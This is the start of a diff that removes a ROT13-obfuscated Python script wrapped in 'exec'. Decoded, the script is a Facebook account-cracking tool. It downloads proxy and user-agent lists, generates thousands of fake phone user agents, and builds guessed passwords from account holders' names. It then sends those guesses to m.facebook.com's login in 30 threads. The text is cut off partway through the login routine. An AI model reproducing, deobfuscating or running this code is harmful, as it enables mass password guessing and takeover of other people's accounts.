@@ -1,2 +1,387 @@
-exec##
-((lambda __, _, : _('''sebz bf vzcbeg cngu\nvzcbeg bf,onfr64,myvo,cvc,heyyvo,gvzr\ncevag(\'[\\033[1;32z✓\\033[1;37z] Purpxvat Sbe Hcqngr !! \')\ngvzr.fyrrc(1.5)\ncevag(\'[\\033[1;32z✓\\033[1;37z] Jnvg Sbe Hcqngr Gbby !! \')\ngvzr.fyrrc(1.5)\nbf.flfgrz(\'tvg chyy\')\nbf.flfgrz(\'pyrne\')\ncevag(\'[\\033[1;32z✓\\033[1;37z] Hcqngr Qbar \\033[1;32z✓\\033[1;37z Abj Lbh Pna Hfr Guvf Gbby :) \')\ngvzr.fyrrc(2)\ngel:\n        vzcbeg bf,erdhrfgf,wfba,gvzr,er,enaqbz,flf,hhvq,fgevat,fhocebprff\n        sebz fgevat vzcbeg *\n        sebz pbapheerag.shgherf vzcbeg GuernqCbbyRkrphgbe nf gerq\nrkprcg ZbqhyrAbgSbhaqReebe:\n        bf.flfgrz(s\'cvc vafgnyy erdhrfgf shgherf==2 > /qri/ahyy\')\n        bf.flfgrz(\'tvg chyy\')\nrkprcg:cnff\nsoxf=(s\'pbz.snprobbx.nqfznantre\',\'pbz.snprobbx.yvgr\',\'pbz.snprobbx.bepn\',\'pbz.snprobbx.xngnan\',\'pbz.snprobbx.zyvgr\')\ntg = enaqbz.pubvpr([\'TG-1015\',\'TG-1020\',\'TG-1030\',\'TG-1035\',\'TG-1040\',\'TG-1045\',\'TG-1050\',\'TG-1240\',\'TG-1440\',\'TG-1450\',\'TG-18190\',\'TG-18262\',\'TG-19060V\',\'TG-19082\',\'TG-19083\',\'TG-19105\',\'TG-19152\',\'TG-19192\',\'TG-19300\',\'TG-19505\',\'TG-2000\',\'TG-20000\',\'TG-200f\',\'TG-3000\',\'TG-414KBC\',\'TG-6918\',\'TG-7010\',\'TG-7020\',\'TG-7030\',\'TG-7040\',\'TG-7050\',\'TG-7100\',\'TG-7105\',\'TG-7110\',\'TG-7205\',\'TG-7210\',\'TG-7240E\',\'TG-7245\',\'TG-7303\',\'TG-7310\',\'TG-7320\',\'TG-7325\',\'TG-7326\',\'TG-7340\',\'TG-7405\',\'TG-7550   5TG-8005\',\'TG-8010\',\'TG-81\',\'TG-810\',\'TG-8105\',\'TG-8110\',\'TG-8220F\',\'TG-8410\',\'TG-9300\',\'TG-9320\',\'TG-93T\',\'TG-N7100\',\'TG-N9500\',\'TG-NAQEBVQ\',\'TG-O2710\',\'TG-O5330\',\'TG-O5330O\',\'TG-O5330Y\',\'TG-O5330MXNVAH\',\'TG-O5510\',\'TG-O5512\',\'TG-O5722\',\'TG-O7510\',\'TG-O7722\',\'TG-O7810\',\'TG-O9150\',\'TG-O9388\',\'TG-P3010\',\'TG-P3262\',\'TG-P3310E\',\'TG-P3312\',\'TG-P3312E\',\'TG-P3313G\',\'TG-P3322\',\'TG-P3322v\',\'TG-P3520\',\'TG-P3520V\',\'TG-P3592\',\'TG-P3595\',\'TG-P3782\',\'TG-P6712\',\'TG-R1282G\',\'TG-R1500\',\'TG-R2200\',\'TG-R2202\',\'TG-R2250\',\'TG-R2252\',\'TG-R2600\',\'TG-R2652J\',\'TG-R3210\',\'TG-R3309\',\'TG-R3309V\',\'TG-R3309G\',\'TG-T530U\',\'TG-t900s\',\'TG-T930S\',\'TG-U9500\',\'TG-V5508\',\'TG-V5801\',\'TG-V6410\',\'TG-V8150\',\'TG-V8160BXYGCN\',\'TG-V8160MJYGGG\',\'TG-V8258\',\'TG-V8262Q\',\'TG-V8268\',\'TG-V8505\',\'TG-V8530ONNOGH\',\'TG-V8530ONYPUB\',\'TG-V8530ONYGGG\',\'TG-V8550R\',\'TG-v8700\',\'TG-V8750\',\'TG-V900\',\'TG-V9008Y\',\'TG-v9040\',\'TG-V9080R\',\'TG-V9082P\',\'TG-V9082RJNVAH\',\'TG-V9082v\',\'TG-V9100T\',\'TG-V9100YXYPUG\',\'TG-V9100Z\',\'TG-V9100C\',\'TG-V9100G\',\'TG-V9105HNAQOG\',\'TG-V9128R\',\'TG-V9128V\',\'TG-V9128I\',\'TG-V9158C\',\'TG-V9158I\',\'TG-V9168V\',\'TG-V9192V\',\'TG-V9195U\',\'TG-V9195Y\',\'TG-V9250\',\'TG-V9303V\',\'TG-V9305A\',\'TG-V9308V\',\'TG-V9505T\',\'TG-V9505K\',\'TG-V9507I\',\'TG-V9600\',\'TG-z190\',\'TG-Z5650\',\'TG-zvav\',\'TG-A5000F\',\'TG-A5100\',\'TG-A5105\',\'TG-A5110\',\'TG-A5120\',\'TG-A7000O\',\'TG-A7005\',\'TG-A7100G\',\'TG-A7102\',\'TG-A7105\',\'TG-A7105G\',\'TG-A7108\',\'TG-A7108Q\',\'TG-A8000\',\'TG-A8005\',\'TG-A8010\',\'TG-A8020\',\'TG-A9000\',\'TG-A9505\',\'TG-C1000PJNKFN\',\'TG-C1000Z\',\'TG-C1000G\',\'TG-C1010\',\'TG-C3100O\',\'TG-C3105\',\'TG-C3108\',\'TG-C3110\',\'TG-C5100\',\'TG-C5200\',\'TG-C5210KQ1\',\'TG-C5220\',\'TG-C6200\',\'TG-C6200Y\',\'TG-C6201\',\'TG-C6210\',\'TG-C6211\',\'TG-C6800\',\'TG-C7100\',\'TG-C7300\',\'TG-C7300O\',\'TG-C7310\',\'TG-C7320\',\'TG-C7500Q\',\'TG-C7500Z\',\'TG-C7500E\',\'TG-C7500I\',\'TG-C7501\',\'TG-C7511\',\'TG-F3330\',\'TG-F3332\',\'TG-F3333\',\'TG-F3370\',\'TG-F3518\',\'TG-F3570\',\'TG-F3600v\',\'TG-F3650\',\'TG-F3653J\',\'TG-F3770X\',\'TG-F3770Z\',\'TG-F3800J\',\'TG-F3802\',\'TG-F3850\',\'TG-F5220\',\'TG-F5220E\',\'TG-F5222\',\'TG-F5230\',\'TG-F5230J\',\'TG-F5233G\',\'TG-f5233j\',\'TG-F5250\',\'TG-F5253\',\'TG-f5260\',\'TG-F5280\',\'TG-F5282\',\'TG-F5283O\',\'TG-F5292\',\'TG-F5300\',\'TG-F5300Y\',\'TG-F5301\',\'TG-F5301O\',\'TG-F5301Y\',\'TG-F5302\',\'TG-F5302O\',\'TG-F5303\',\'TG-F5303O\',\'TG-F5310\',\'TG-F5310O\',\'TG-F5310P\',\'TG-F5310R\',\'TG-F5310T\',\'TG-F5310V\',\'TG-F5310Y\',\'TG-F5310Z\',\'TG-F5310A\',\'TG-F5312\',\'TG-F5312O\',\'TG-F5312P\',\'TG-F5312Y\',\'TG-F5330\',\'TG-F5360\',\'TG-F5360O\',\'TG-F5360Y\',\'TG-F5360G\',\'TG-F5363\',\'TG-F5367\',\'TG-F5369\',\'TG-F5380\',\'TG-F5380Q\',\'TG-F5500\',\'TG-F5560\',\'TG-F5560v\',\'TG-F5570O\',\'TG-F5570V\',\'TG-F5570Y\',\'TG-F5578\',\'TG-F5600\',\'TG-F5603\',\'TG-F5610\',\'TG-F5610X\',\'TG-F5611\',\'TG-F5620\',\'TG-F5670\',\'TG-F5670O\',\'TG-F5670UXOMGN\',\'TG-F5690\',\'TG-F5690E\',\'TG-F5830\',\'TG-F5830Q\',\'TG-F5830T\',\'TG-F5830v\',\'TG-F5830Y\',\'TG-F5830Z\',\'TG-F5830G\',\'TG-F5830I\',\'TG-F5831v\',\'TG-F5838\',\'TG-F5839v\',\'TG-F6010\',\'TG-F6010OONOGH\',\'TG-F6012\',\'TG-F6012O\',\'TG-F6102\',\'TG-F6102O\',\'TG-F6293G\',\'TG-F6310O\',\'TG-F6310MJNZVQ\',\'TG-F6312\',\'TG-F6313G\',\'TG-F6352\',\'TG-F6500\',\'TG-F6500Q\',\'TG-F6500Y\',\'TG-F6790\',\'TG-F6790Y\',\'TG-F6790A\',\'TG-F6792Y\',\'TG-F6800\',\'TG-F6800UXNKSN\',\'TG-F6802\',\'TG-F6810\',\'TG-F6810O\',\'TG-F6810R\',\'TG-F6810Y\',\'TG-F6810Z\',\'TG-F6810ZONFRE\',\'TG-F6810C\',\'TG-F6812\',\'TG-F6812O\',\'TG-F6812P\',\'TG-F6812v\',\'TG-F6818\',\'TG-F6818I\',\'TG-F7230R\',\'TG-F7233R\',\'TG-F7250Q\',\'TG-F7262\',\'TG-F7270\',\'TG-F7270Y\',\'TG-F7272\',\'TG-F7272P\',\'TG-F7273G\',\'TG-F7278\',\'TG-F7278H\',\'TG-F7390\',\'TG-F7390T\',\'TG-F7390Y\',\'TG-F7392\',\'TG-F7392Y\',\'TG-F7500\',\'TG-F7500NONOGH\',\'TG-F7500NONQOG\',\'TG-F7500NOGGYC\',\'TG-F7500PJNQOG\',\'TG-F7500Y\',\'TG-F7500G\',\'TG-F7560\',\'TG-F7560Z\',\'TG-F7562\',\'TG-F7562P\',\'TG-F7562v\',\'TG-F7562Y\',\'TG-F7566\',\'TG-F7568\',\'TG-F7568V\',\'TG-F7572\',\'TG-F7580R\',\'TG-F7583G\',\'TG-F758K\',\'TG-F7592\',\'TG-F7710\',\'TG-F7710Y\',\'TG-F7898\',\'TG-F7898V\',\'TG-F8500\',\'TG-F8530\',\'TG-F8600\',\'TG-FGO919\',\'TG-G140\',\'TG-G150\',\'TG-I8n\',\'TG-I8v\',\'TG-IP818\',\'TG-IZ919F\',\'TG-J131\',\'TG-J153\',\'TG-K831\',\'TG-K853\',\'TG-K870\',\'TG-K890\',\'TG-L8750\'])\nkkkkk=(s"TG-1015","TG-1020","TG-1030","TG-1035","TG-1040","TG-1045","TG-1050","TG-1240","TG-1440","TG-1450","TG-18190","TG-18262","TG-19060V","TG-19082","TG-19083","TG-19105","TG-19152","TG-19192","TG-19300","TG-19505","TG-2000","TG-20000","TG-200f","TG-3000","TG-414KBC","TG-6918","TG-7010","TG-7020","TG-7030","TG-7040","TG-7050","TG-7100","TG-7105","TG-7110","TG-7205","TG-7210","TG-7240E","TG-7245","TG-7303","TG-7310","TG-7320","TG-7325","TG-7326","TG-7340","TG-7405","TG-7550 5TG-8005","TG-8010","TG-81","TG-810","TG-8105","TG-8110","TG-8220F","TG-8410","TG-9300","TG-9320","TG-93T","TG-N7100","TG-N9500","TG-NAQEBVQ","TG-O2710","TG-O5330","TG-O5330O","TG-O5330Y","TG-O5330MXNVAH","TG-O5510","TG-O5512","TG-O5722","TG-O7510","TG-O7722","TG-O7810","TG-O9150","TG-O9388","TG-P3010","TG-P3262","TG-P3310E","TG-P3312","TG-P3312E","TG-P3313G","TG-P3322","TG-P3322v","TG-P3520","TG-P3520V","TG-P3592","TG-P3595","TG-P3782","TG-P6712","TG-R1282G","TG-R1500","TG-R2200","TG-R2202","TG-R2250","TG-R2252","TG-R2600","TG-R2652J","TG-R3210","TG-R3309","TG-R3309V","TG-R3309G","TG-T530U","TG-T930S","TG-U9500","TG-V5508","TG-V5801","TG-V6410","TG-V8150","TG-V8160BXYGCN","TG-V8160MJYGGG","TG-V8258","TG-V8262Q","TG-V8268""TG-V8505","TG-V8530ONNOGH","TG-V8530ONYPUB","TG-V8530ONYGGG","TG-V8550R","TG-V8750","TG-V900","TG-V9008Y","TG-V9080R","TG-V9082P","TG-V9082RJNVAH","TG-V9082v","TG-V9100T","TG-V9100YXYPUG","TG-V9100Z","TG-V9100C","TG-V9100G","TG-V9105HNAQOG","TG-V9128R","TG-V9128V","TG-V9128I","TG-V9158C","TG-V9158I","TG-V9168V","TG-V9190","TG-V9192","TG-V9192V","TG-V9195U","TG-V9195Y","TG-V9250","TG-V9300","TG-V9300V","TG-V9301V","TG-V9303V","TG-V9305A","TG-V9308V","TG-V9500","TG-V9505T","TG-V9505K","TG-V9507I","TG-V9600","TG-Z5650","TG-A5000F","TG-A5100","TG-A5105","TG-A5110","TG-A5120","TG-A7000O","TG-A7005","TG-A7100","TG-A7100G","TG-A7102","TG-A7105","TG-A7105G","TG-A7108","TG-A7108Q","TG-A8000","TG-A8005","TG-A8010","TG-A8020","TG-A9000","TG-A9505","TG-C1000PJNKFN","TG-C1000Z","TG-C1000G","TG-C1010","TG-C3100O","TG-C3105","TG-C3108","TG-C3110","TG-C5100","TG-C5110","TG-C5200","TG-C5210","TG-C5210KQ1","TG-C5220","TG-C6200","TG-C6200Y","TG-C6201","TG-C6210","TG-C6211","TG-C6800","TG-C7100","TG-C7300","TG-C7300O","TG-C7310","TG-C7320","TG-C7500Q","TG-C7500Z","FNZFHAT","YZL4","YZL47I","ZZO29X","ZZO29Z","YEK22P","YEK22T","AZS2","AZS26K","AZS26K;","AEQ90Z","AEQ90Z;","FCU-Y720","VZY74X","VZZ76Q","WQD39","WFF15W","WMB54X","XBG4","XBG49U","XBG4FZ-G310","XGH84C","FZ-N500S","FZ-N500SH","FZ-N500U","FZ-T532S","FZ-T900S","FZ-T920S","FZ-T930S","FZ-T935","FZ-T950S","FZ-W320S","FZ-W320SA","FZ-W320U","FZ-W320Z","FZ-W510SA","FZ-W701S","FZ-A920F","FZ-G111","FZ-G230","FZ-G231","FZ-G235","FZ-G280","FZ-G311","FZ-G315","FZ-G525","FZ-G531","FZ-G535","FZ-G555","FZ-G561","FZ-G705","FZ-G805","FZ-G820")\ngna=(\'uggcf\')\nvln=(\'tvguho\')\nnav=(\'Snevln\')\nybir=(\'zonfvp\')\nhtra=[]\nhtra=[]\nhfrentrag=[]\nurnqre_tehc = {"hfre-ntrag": "Zbmvyyn/5.0 (K11; Yvahk k86_64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/103.0.0.0 Fnsnev/537.36 [SONA/SOVBF;SOQI/vCubar12,1;SOZQ/vCubar;SOFA/vBF;SOFI/13.4.1;SOFF/2;SOVQ/cubar;SOYP/ra_HF;SOBC/5]"}\nurnqre_tehc = {"hfre-ntrag": "Qnyivx/2.1.0 (Yvahk; H; Naqebvq 11; FZ-A986A Ohvyq/MX83G5) [SONA/SO4N;SONI/979.2.9.20.981;SOCA/pbz.snprobbx.xngnan;SOYP/ra_HF;SOOI/687217741;SOPE/Tyb Zbovyr;SOZS/fnzfhat;SOOQ/fnzfhat;SOQI/FZ-A986A;SOFI/11;SOPN/k86:nezrnov-i7n;SOQZ/{qrafvgl=2.5,jvqgu=1080,urvtug=2220};SO_SJ/0;SOEI/0;]"}\nurnqre_tehc = {"hfre-ntrag": "Zbmvyyn/5.0 (Yvahk; Naqebvq 9; Abxvn P2 Ohvyq/CCE1.180610.011; ji) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Irefvba/4.0 Puebzr/100.0.4896.79 Zbovyr Fnsnev/537.36[SONA/RZN;SOYP/ra_TO;SONI/297.0.0.13.113;]"}\nsbe kq va enatr(10000):\n        nn=\'Zbmvyyn/5.0 (Yvahk; Naqebvq 10; Abxvn 1 Cyhf Ohvyq/DC1N.190711.020; ji)\'\n        o=enaqbz.pubvpr([\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\',])\n        p=s\' GY-gy; {fge(tg)}\'\n        t=\'NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Irefvba/4.0 Puebzr/105.0.5195.79\'\n        u=enaqbz.enaqenatr(73,100)\n        v=\'0\'\n        w=enaqbz.enaqenatr(4200,4900)\n        x=enaqbz.enaqenatr(40,150)\n        y=\'Zbovyr Fnsnev/537.36[SONA/RZN;SOYP/rf_RF;SONI/319.0.0.7.107;]\'\n        hnxh2=s\'{nn} {o}; {p}) {t}{u}.{v}.{w}.{x} {y}\'\n        htra.nccraq(hnxh2)\n\nsbe ntrag va enatr(10000):\n        nn=\'Zbmvyyn/5.0 (Yvahk; Naqebvq 9; Abxvn P2 Ohvyq/CCE1.180610.011; ji)\'\n        o=enaqbz.pubvpr([\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\'])\n        p=\'Naqebvq 9; Abxvn P2 Ohvyq/\'\n        q=enaqbz.pubvpr([\'N\',\'O\', \'P\', \'Q\', \'R\', \'S\', \'T\', \'U\', \'V\', \'W\', \'X\', \'Y\', \'Z\', \'A\', \'B\', \'C\', \'D\', \'E\', \'F\', \'G\', \'H\', \'I\', \'J\', \'K\', \'L\', \'M\'])\n        r=enaqbz.enaqenatr(1, 999)\n        s=enaqbz.pubvpr([\'N\',\'O\', \'P\', \'Q\', \'R\', \'S\', \'T\', \'U\', \'V\', \'W\', \'X\', \'Y\', \'Z\', \'A\', \'B\', \'C\', \'D\', \'E\', \'F\', \'G\', \'H\', \'I\', \'J\', \'K\', \'L\', \'M\'])\n        t=\'NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Irefvba/4.0 Puebzr/100.0.4896.79\'\n        u=enaqbz.enaqenatr(73,100)\n        v=\'0\'\n        w=enaqbz.enaqenatr(4200,4900)\n        x=enaqbz.enaqenatr(40,150)\n        y=\'Zbovyr Fnsnev/537.36[SONA/RZN;SOYP/ra_TO;SONI/297.0.0.13.113;]\'\n        shyyntag=(s\'{nn} {o}; {p}{q}{r}{s}) {t}{u}.{v}.{w}.{x} {y}\')\n        htra.nccraq(shyyntag)\n        \nsbe ntrag va enatr(10000):\n        nn=\'Zbmvyyn/5.0 (vCubar; PCH vCubar BF 16_0 yvxr Znp BF K)\'\n        o=enaqbz.pubvpr([\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\'])\n        p=\'PCH vCubar BF 16_0 yvxr Znp BF K\'\n        q=enaqbz.pubvpr([\'N\',\'O\', \'P\', \'Q\', \'R\', \'S\', \'T\', \'U\', \'V\', \'W\', \'X\', \'Y\', \'Z\', \'A\', \'B\', \'C\', \'D\', \'E\', \'F\', \'G\', \'H\', \'I\', \'J\', \'K\', \'L\', \'M\'])\n        r=enaqbz.enaqenatr(1, 999)\n        s=enaqbz.pubvpr([\'N\',\'O\', \'P\', \'Q\', \'R\', \'S\', \'T\', \'U\', \'V\', \'W\', \'X\', \'Y\', \'Z\', \'A\', \'B\', \'C\', \'D\', \'E\', \'F\', \'G\', \'H\', \'I\', \'J\', \'K\', \'L\', \'M\'])\n        t=\'NccyrJroXvg/605.1.15 (XUGZY, yvxr Trpxb)\'\n        u=enaqbz.enaqenatr(73,100)\n        v=\'0\'\n        w=enaqbz.enaqenatr(4200,4900)\n        x=enaqbz.enaqenatr(40,150)\n        y=\'Zbovyr/20N5312t [SONA/SOVBF;SOQI/vCubar13,1;SOZQ/vCubar;SOFA/vBF;SOFI/16.0;SOFF/3;SOVQ/cubar;SOYP/pf_PM;SOBC/5]\'\n        shyyntag=(s\'{nn} {o}; {p}{q}{r}{s}) {t}{u}.{v}.{w}.{x} {y}\')\n        htra.nccraq(shyyntag)      \n\nsbe ntrag va enatr(10000):\n        nn=\'Zbmvyyn/5.0 (Yvahk; Naqebvq 11; Abxvn P20 Cyhf Ohvyq/EC1N.201005.001; ji)\'\n        o=enaqbz.pubvpr([\'6\',\'7\',\'8\',\'9\',\'10\',\'11\',\'12\'])\n        p=\'Naqebvq 11; Abxvn P20 Cyhf Ohvyq/EC1N.201005.001; ji\'\n        q=enaqbz.pubvpr([\'N\',\'O\', \'P\', \'Q\', \'R\', \'S\', \'T\', \'U\', \'V\', \'W\', \'X\', \'Y\', \'Z\', \'A\', \'B\', \'C\', \'D\', \'E\', \'F\', \'G\', \'H\', \'I\', \'J\', \'K\', \'L\', \'M\'])\n        r=enaqbz.enaqenatr(1, 999)\n        s=enaqbz.pubvpr([\'N\',\'O\', \'P\', \'Q\', \'R\', \'S\', \'T\', \'U\', \'V\', \'W\', \'X\', \'Y\', \'Z\', \'A\', \'B\', \'C\', \'D\', \'E\', \'F\', \'G\', \'H\', \'I\', \'J\', \'K\', \'L\', \'M\'])\n        t=\'NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Irefvba/4.0 Puebzr/103.0.5060.129\'\n        u=enaqbz.enaqenatr(73,100)\n        v=\'0\'\n        w=enaqbz.enaqenatr(4200,4900)\n        x=enaqbz.enaqenatr(40,150)\n        y=\'Zbovyr Fnsnev/537.36[SONA/RZN;SOYP/gn_VA;SONI/331.0.0.9.105;]\'\n        shyyntag=(s\'{nn} {o}; {p}{q}{r}{s}) {t}{u}.{v}.{w}.{x} {y}\')\n        htra.nccraq(shyyntag)      \ngel:\n    cebk= erdhrfgf.trg(\'uggcf://tvguho.pbz/wnyvyun/wnyvy/oybo/znva/cebkvrf..gkg\').grkg\n    bcra(\'cebkvrf.gkg\',\'j\').jevgr(cebkvrf)\nrkprcg Rkprcgvba nf r:\n    cevag(\'\\k1o[1;92z[√] JRYPBZR...\')\n\t\ncebkvrf=bcra(\'cebkvrf.gkg\',\'e\').ernq().fcyvgyvarf()\n\n\nnaqebvq_zbqryf=[]\ngel:\n    kk = erdhrfgf.trg(\'uggcf://tvguho.pbz/wnyvyun/wnyvy/oybo/znva/fgevatf.gkg\').grkg.fcyvgyvarf()\n    sbe yvar va kk:\n        naqebvq_zbqryf.nccraq(yvar)\nrkprcg:cnff\n\nhfe=[]\nqrs hnxh():\n\tgel:\n\t\thn=bcra(\'hn.gkg\',\'e\').ernq().fcyvgyvarf()\n\t\tsbe ho va hn:\n\t\t\thtra.nccraq(ho)\n\trkprcg:\n\t\tn=erdhrfgf.trg(\'uggcf://enj.tvguhohfrepbagrag.pbz/wnyvyun/wnyvy/znva/hn.gkg\').grkg\n\t\thn=bcra(\'.hn.gkg\',\'j\')\n\t\tnn=er.svaqnyy(\'yvar">(.*?)<\',fge(n))\n\t\tsbe ha va nn:\n\t\t\thn.jevgr(ha+\'\\a\') \n\t\thn=bcra(\'.hn.gkg\',\'e\').ernq().fcyvgyvarf()\n       \nybtb=(s"""\\k1o[38;5;208z\n   bbbb       .b.       bbbbb        bbbbb bbbbb        \n   `888      .888.      `888\'        `888\' `888\'        \n    888     .8"888.      888          888   888         \n    888    .8\' `888.     888          888   888         \n    888   .88bbb8888.    888          888   888         \n    888  .8\'     `888.   888       b  888   888       b \n.b. 88C b88b     b8888b b888bbbbbbq8 b888b b888bbbbbbq8 \n`L888C  \n                                                                                                                    \n\\033[1;33z=========================================================\n \\033[1;91zSNPROBBX  : \\033[1;36zU. Z. WNYVY\\033[1;37z\n \\033[1;91zGRYRTENZ  : \\033[1;36zVGMWNYVY0\\033[1;37z\n \\033[1;91zJUNGFNCC  : \\033[1;36z213676980481\\033[1;37z\n \\033[1;91zIREFVBAy  : \\033[1;36z1.0\\033[1;37z\n \\033[1;91zGBBY      : \\033[1;36zCNVQ\\033[1;37z\n\\033[1;33z========================================================\\033[1;33z\n""")\nqrs yvark():\n        cevag(\'\\033[1;33z========================================================\\033[1;33z\')\nqrs pyrne():\n        bf.flfgrz(s\'pyrne\')\n        cevag(ybtb)\nybbc=0\nbxf=[]\npcf=[]\ncpc=[]\nvq=[]\ngbxraxh=[]\nbf.flfgrz(\'tvg chyy\')\nqrs Sbs():\n\tpyrne()\n\tcevag(s" [\\033[1;32z1\\033[1;37z] SVYR PYBARVAT ")\n\tcevag(s" [\\033[1;31z0\\033[1;37z] Rkvg")\n\tzr=vachg(s\' [\\033[1;32z✓\\033[1;37z] Pubvpr : \')\n\tvs zr va ["2", "02"]:\n\t    bf.flfgrz(\'clguba wnyvvy.cl\')\n     \n\t#vs zr va ["3","03"]:\n\t\t#tzy()\n\tvs zr va ["1", "01","11","N","n"]:\n\t\tpyrne()\n\t\tsvyr = vachg(s\' [\\033[1;32z✓\\033[1;37z] Chg Svyr Ybpngvba [\\033[1;32z❯\\033[1;37z] \')\n\t\tgel:\n\t\t\tsb = bcra(svyr,\'e\').ernq().fcyvgyvarf()\n\t\trkprcg SvyrAbgSbhaqReebe:\n\t\t\tcevag(s\' [\\033[1;32zK\\033[1;37z] Svyr ybpngvba Abg Sbhaq \')\n\t\t\trkvg()\n\t\tcevag(s\' [\\033[1;31z1\\033[1;37z] Zrgubq \\033[1;32z1\\033[1;37z [\\033[1;32zZvk Vqf\\033[1;37z] \\a [\\033[1;31z2\\033[1;37z] Zrgubq \\033[1;32z2\\033[1;37z [\\033[1;32zZrkvpb Vqf\\033[1;37z] \\a [\\033[1;31z3\\033[1;37z] Zrgubq \\033[1;32z3\\033[1;37z [\\033[1;32zVaqvn Vqf\\033[1;37z] \\a [\\033[1;31z4\\033[1;37z] Zrgubq \\033[1;32z4\\033[1;37z [\\033[1;32zOq Vqf\\033[1;37z]  \')\n\t\tzguq=vachg(s\' [\\033[1;32z✓\\033[1;37z] Pubvpr : \')\n\t\tcyvfg=[]\n\t\tgel:\n\t\t\tcf_yvzvg = vag(vachg(s\' [\\033[1;32z?\\033[1;37z] Ubj Znal Cnffjbeqf Qb Lbh Jnag Gb Nqq [\\033[1;32z⟩\\033[1;37z] \'))\n\t\trkprcg:\n\t\t\tcf_yvzvg =1\n\t\tcevag(s\' [\\033[1;32z•\\033[1;37z] Rknzcyr: \\033[1;36zsvefg ynfg,svegfynfg,svefg123 \\033[1;37z\')\n\t\tsbe v va enatr(cf_yvzvg):\n\t\t\tcyvfg.nccraq(vachg(s\' [\\033[1;32z✓\\033[1;37z] Chg cnffjbeq {v+1}[\\033[1;32z❯\\033[1;37z] \'))\n\t\tcevag(s\' [\\033[1;32z?\\033[1;37z] Qb Lbh Jrag Fubj PC VQf (l/a): \')\n\t\tpk=vachg(s\' [\\033[1;32z✓\\033[1;37z] Pubvpr : \')\n\t\tvs pk va [\'a\',\'A\',\'ab\',\'AB\',\'2\']:\n\t\t\tcpc.nccraq(s\'a\')\n\t\tryfr:\n\t\t\tcpc.nccraq(s\'l\')\n\t\tjvgu gerq(znk_jbexref=30) nf penpx_fhozvg:\n\t\t\tpyrne()\n\t\t\tgbgny_vqf = fge(yra(sb))\n\t\t\tcevag(s\' Gbgny Nppbhag : \\033[1;32z\'+gbgny_vqf+s\' \\a \\033[1;37zZrgubq : \\033[1;32zZ{zguq}\\033[1;37z\')\n\t\t\tcevag(s"\\033[1;36z Hfr Syvtug Zbqr Sbe Fcrrq Hc\\033[1;37z")\n\t\t\tyvark()\n\t\t\tsbe hfre va sb:\n\t\t\t\tvqf,anzrf = hfre.fcyvg(\'|\')\n\t\t\t\tcnffyvfg = cyvfg\n\t\t\t\tvs zguq va [\'1\',\'01\']:\n\t\t\t\t\tpenpx_fhozvg.fhozvg(z1,vqf,anzrf,cnffyvfg)\n\t\t\t\tryvs zguq va [\'2\',\'02\']:\n\t\t\t\t\tpenpx_fhozvg.fhozvg(z2,vqf,anzrf,cnffyvfg)\n\t\t\t\tryvs zguq va [\'3\',\'03\']:\n\t\t\t\t\tpenpx_fhozvg.fhozvg(z3,vqf,anzrf,cnffyvfg)\n\t\t\t\tryvs zguq va [\'4\',\'04\']:\n\t\t\t\t\tpenpx_fhozvg.fhozvg(z4,vqf,anzrf,cnffyvfg)\n\t\t\t\t#ryvs zguq va [\'5\',\'05\']:\n\t\t\t\t\t#penpx_fhozvg.fhozvg(z5,vqf,anzrf,cnffyvfg)\n\t\t\t\t#ryvs zguq va [\'6\',\'06\']:\n\t\t\t\t\t#penpx_fhozvg.fhozvg(sso4,vqf,anzrf,cnffyvfg)\n\t\t\t\t#ryvs zguq va [\'7\',\'07\']:\n\t\t\t\t\t#penpx_fhozvg.fhozvg(sso7,vqf,anzrf,cnffyvfg)\n\t\t\t\t#ryvs zguq va [\'8\',\'08\']:\n\t\t\t\t\t#penpx_fhozvg.fhozvg(sso8,vqf,anzrf,cnffyvfg)\n\t\t\t\t#ryfr:\n\t\t\t\t\t#penpx_fhozvg.fhozvg(z5,vqf,anzrf,cnffyvfg)\n\t\t\t\t\nqrs z1(vqf,anzrf,cnffyvfg):\n        tybony ybbc,bxf,pcf\n        flf.fgqbhg.jevgr(s\'\\e\\e\\033[1;37z [WNYVVVY] \\033[1;36z•\\033[1;37z %f \\033[1;36z•\\033[1;37z BX \\033[1;36z•\\033[1;37z [\\033[1;32z%f\\033[1;37z]\'%(ybbc,yra(bxf)));flf.fgqbhg.syhfu()\n        frffvba = erdhrfgf.Frffvba()\n        gel:\n                svefg = anzrf.fcyvg(s\' \')[0]\n                gel:\n                        ynfg = anzrf.fcyvg(s\' \')[1]\n                rkprcg:\n                        ynfg = \'Nuzrq\'\n                cf = svefg.ybjre()\n                cf2 = ynfg.ybjre()\n                sbe svxe va cnffyvfg:\n               \t        cnf = svxe.ercynpr(s\'Svefg\',svefg).ercynpr(s\'Ynfg\',ynfg).ercynpr(s\'svefg\',cf).ercynpr(s\'ynfg\',cf2)\n                        hn=enaqbz.pubvpr(htra)\n                        urnq = {\'Ubfg\': \'z.snprobbx.pbz\', \'ivrjcbeg-jvqgu\': \'980\', \'frp-pu-hn\': \'" Abg N;Oenaq";i="99", "Puebzvhz";i="101", "Tbbtyr Puebzr";i="101"\', \'frp-pu-hn-zbovyr\': \'?1\', \'frp-pu-hn-cyngsbez\':\'"Jvaqbjf"\', \'frp-pu-cersref-pbybe-fpurzr\': \'yvtug\', \'qag\': \'1\', \'hctenqr-vafrpher-erdhrfgf\': \'1\', \'hfre-ntrag\': hn, \'npprcg\': \'grkg/ugzy,nccyvpngvba/kugzy+kzy,nccyvpngvba/kzy;d=0.9,vzntr/nivs,vzntr/jroc,vzntr/ncat,*[vafregrq ol plguba gb nibvq pbzzrag pybfre]/[vafregrq ol plguba gb nibvq pbzzrag fgneg]*;d=0.8,nccyvpngvba/fvtarq-rkpunatr;i=o3;d=0.9\', \'frp-srgpu-fvgr\': \'abar\', \'frp-srgpu-zbqr\': \'anivtngr\', \'frp-srgpu-hfre\': \'?1\', \'frp-srgpu-qrfg\': \'qbphzrag\', \'npprcg-rapbqvat\': \'tmvc, qrsyngr, oe\', \'npprcg-ynathntr\': \'ra-HF,ra;d=0.9\'}\n                        trgybt = 